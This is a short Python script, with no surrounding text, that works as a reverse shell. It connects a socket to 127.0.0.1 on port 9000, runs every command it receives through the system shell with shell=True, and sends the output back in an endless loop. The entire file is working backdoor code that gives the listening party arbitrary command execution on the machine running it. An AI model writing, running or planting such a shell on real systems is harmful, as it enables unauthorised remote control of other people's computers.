import socket

import subprocess 

s=socket.socket() 

s.connect(("127.0.0.1",9000)) 

while 1:

  p = subprocess.Popen(s.recv(1024),  shell=True,stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)

  s.send(p.stdout.read() + p.stderr.read())
